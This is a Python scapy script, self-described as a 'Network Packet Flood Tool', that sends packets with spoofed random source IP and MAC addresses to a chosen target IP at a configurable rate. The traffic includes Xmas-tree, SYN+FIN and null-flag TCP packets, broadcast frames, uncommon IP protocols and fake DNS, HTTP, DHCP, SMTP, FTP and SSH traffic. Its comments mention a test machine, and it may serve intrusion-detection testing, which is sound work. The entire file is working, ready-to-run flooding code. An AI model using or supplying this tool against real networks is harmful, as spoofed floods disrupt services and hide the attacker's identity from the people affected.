from scapy.all import *
import random
import time

# Define target IP (Use your local network IP or target system)
TARGET_IP = "10.0.9.59"  # Change this to your test machine
INTERFACE = "eth0"  # Change to your active network interface

# Generate a random IP
def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# Generate a random MAC address
def random_mac():
    return ":".join(f"{random.randint(0x00, 0xFF):02x}" for _ in range(6))

# Generate random TCP flags
def random_tcp_flags():
    flags = ["S", "A", "F", "R", "P", "U"]  # SYN, ACK, FIN, RST, PSH, URG
    
    # Sometimes generate unusual flag combinations
    if random.random() < 0.2:
        # Christmas tree packet (all flags set)
        if random.random() < 0.5:
            return "SAFPRU"
        # SYN+FIN (unusual/suspicious combination)
        else:
            return "SF"
    
    # Null packet (no flags)
    if random.random() < 0.1:
        return ""
    
    # Normal random flags
    return "".join(random.sample(flags, k=random.randint(1, len(flags))))

# Function to generate random payload of varying size
def random_payload(min_size=10, max_size=1000):  # Reduced max size to avoid "Message too long" errors
    size = random.randint(min_size, max_size)
    return os.urandom(size)

# List of protocols to use 
PROTOCOLS = [
    "TCP", "UDP", "ICMP", "IP", "DNS", "HTTP", "DHCP", 
    "SMTP", "FTP", "SSH"
    # Removed problematic protocols: "IPv6", "IGMP", "SCTP"
]

# Function to flood network with different packet types and sizes
def flood_network(duration=10, packets_per_second=10):
    start_time = time.time()
    packet_count = 0
    
    print(f"Starting flood with {len(PROTOCOLS)} different protocol types...")
    
    while time.time() - start_time < duration:
        # Select random protocol
        packet_type = random.choice(PROTOCOLS)
        
        src_ip = random_ip()
        dst_ip = TARGET_IP
        src_port = random.randint(1024, 65535)
        dst_port = random.randint(1, 65535)
        
        # Generate random size payload (some normal, some very large/small)
        if random.random() < 0.8:
            # Normal size packets (40-500 bytes)
            payload = random_payload(40, 500)
        elif random.random() < 0.5:
            # Very small packets (potentially suspicious)
            payload = random_payload(5, 30)
        else:
            # Larger packets but not too large
            payload = random_payload(600, 1000)
        
        # Basic Ethernet frame (change destination to broadcast occasionally)
        if random.random() < 0.3:
            eth = Ether(src=random_mac(), dst="ff:ff:ff:ff:ff:ff")
        else:
            eth = Ether(src=random_mac(), dst=random_mac())
            
        # Generate different packet types based on protocol
        try:
            if packet_type == "TCP":
                # Randomize IP options occasionally
                if random.random() < 0.1:
                    ip_options = IPOption_Timestamp()
                    ip_layer = IP(src=src_ip, dst=dst_ip, options=ip_options)
                else:
                    ip_layer = IP(src=src_ip, dst=dst_ip)
                
                # Create TCP packet with random flags
                flags = random_tcp_flags()
                packet = eth / ip_layer / TCP(sport=src_port, dport=dst_port, flags=flags) / Raw(load=payload)
                
                # Track specific flag combination for output
                flags_desc = f"flags={flags}" if flags else "NULL flags"
                
            elif packet_type == "UDP":
                packet = eth / IP(src=src_ip, dst=dst_ip) / UDP(sport=src_port, dport=dst_port) / Raw(load=payload)
                flags_desc = ""
                
            elif packet_type == "ICMP":
                # Randomize ICMP types
                icmp_type = random.choice([0, 8, 13, 17])  # echo-reply, echo-request, timestamp, address mask
                packet = eth / IP(src=src_ip, dst=dst_ip) / ICMP(type=icmp_type) / Raw(load=payload)
                flags_desc = f"type={icmp_type}"
                
            elif packet_type == "IP":
                # Raw IP packet with random protocol
                proto = random.randint(143, 252)  # Use uncommon protocol numbers
                packet = eth / IP(src=src_ip, dst=dst_ip, proto=proto) / Raw(load=payload)
                flags_desc = f"proto={proto}"
                
            elif packet_type == "DNS":
                # Forge DNS query
                qname = f"test{random.randint(1,1000)}.example.com"
                packet = eth / IP(src=src_ip, dst=dst_ip) / UDP(sport=src_port, dport=53) / \
                        DNS(rd=1, qd=DNSQR(qname=qname))
                flags_desc = f"query={qname}"
                
            elif packet_type == "HTTP":
                # HTTP request
                http_methods = ["GET", "POST", "PUT", "DELETE", "HEAD"]
                method = random.choice(http_methods)
                http_req = f"{method} /{random.randint(1,1000)} HTTP/1.1\r\nHost: example.com\r\n\r\n"
                packet = eth / IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=80, flags="PA") / Raw(load=http_req)
                flags_desc = f"method={method}"
                
            elif packet_type == "DHCP":
                # DHCP discover packet
                packet = eth / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / \
                        BOOTP(chaddr=random_mac()) / DHCP(options=[("message-type", "discover"), "end"])
                flags_desc = "discover"
                
            elif packet_type == "SMTP":
                # SMTP command
                commands = ["HELO", "MAIL FROM", "RCPT TO", "DATA"]
                cmd = random.choice(commands)
                packet = eth / IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=25, flags="PA") / \
                        Raw(load=f"{cmd} test\r\n")
                flags_desc = f"cmd={cmd}"
                
            elif packet_type == "FTP":
                # FTP command
                commands = ["USER", "PASS", "LIST", "CWD", "RETR"]
                cmd = random.choice(commands)
                packet = eth / IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=21, flags="PA") / \
                        Raw(load=f"{cmd} test\r\n")
                flags_desc = f"cmd={cmd}"
                
            elif packet_type == "SSH":
                # SSH-like packet
                packet = eth / IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=22, flags="PA") / \
                        Raw(load=payload)
                flags_desc = ""
            
            # Determine packet size for logging
            packet_size = len(packet)
            
            # Send the packet
            sendp(packet, iface=INTERFACE, verbose=False)
            packet_count += 1
            
            # Print details and ensure we don't flood the terminal
            if packet_count % 10 == 0:
                extra_info = f", {flags_desc}" if flags_desc else ""
                print(f"Sent {packet_type} packet: {src_ip}:{src_port} → {dst_ip}:{dst_port}, size={packet_size}{extra_info}")
                
        except Exception as e:
            print(f"Error sending {packet_type} packet: {e}")
        
        # Control sending rate
        time.sleep(1/packets_per_second)
    
    return packet_count

# Main execution
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Network Packet Flood Tool")
    parser.add_argument("-d", "--duration", type=int, default=10, help="Duration of flooding in seconds")
    parser.add_argument("-r", "--rate", type=int, default=10, help="Packets per second to send")
    parser.add_argument("-t", "--target", type=str, help="Target IP address")
    parser.add_argument("-i", "--interface", type=str, help="Network interface to use")
    
    args = parser.parse_args()
    
    # Override defaults with command line arguments if provided
    if args.target:
        TARGET_IP = args.target
    if args.interface:
        INTERFACE = args.interface
        
    print(f"Starting network flood to {TARGET_IP} via {INTERFACE}...")
    print(f"Duration: {args.duration} seconds, Rate: {args.rate} packets/sec")
    
    total_packets = flood_network(duration=args.duration, packets_per_second=args.rate)
    
    print(f"Flooding completed. Sent {total_packets} packets.")
